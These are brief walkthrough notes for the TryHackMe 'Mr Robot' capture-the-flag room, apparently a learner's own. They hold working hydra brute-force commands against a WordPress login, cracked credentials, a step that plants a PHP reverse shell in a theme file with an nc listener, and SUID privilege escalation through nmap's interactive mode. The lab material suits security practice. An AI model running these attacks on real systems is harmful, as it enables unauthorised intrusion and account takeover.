[https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)
   

10.10.37.183  
80  
443
 
- nikto:

1.9.32.3 in header  
208.185.115.6 index page  
/admin/indext.html  
/readme  
/robots.txt  
/license.txt  
/wp-login/  
/wordpress/
 
- in robots.txt:

User-agent: *  
fsocity.dic  
key-1-of-3.txt *******
 
- the website says that the username only is incorrect so lets find the username first with a static password

hydra -t 4 -L /root/fsocity.dic -p test 10.10.37.183 http-post-form "/wp-login.php:log=^USER^&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.37.183%2Fwp-admin%2F&testcookie=1:Invalid username."
 
- now find the password with the known username

hydra -t 4 -l Elliot -P /root/fsocity.dic 10.10.37.183 http-post-form "/wp-login.php:log=Elliot&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.37.183%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
 
Elliot:ER28-0652  
go to appearences -> editor -> archive.php  
paste php rev shell  
nc listener
 
go to [http://10.10.37.183/wp-content/themes/twentyfifteen/archive.php](http://10.10.37.183/wp-content/themes/twentyfifteen/archive.php)
 
- in home dir of robot:

key 2 *******  
robot:c3fcd3d76192e4007dfb496cca67e13b  
robot:abcdefghijklmnopqrstuvwxyz
 
su robot
 
find / -type f -user root -perm /4000 2>/dev/null  
/nmap
 
GTFObins
 
nmap --interactive  
!sh
 
cd /root
 
key 3 *******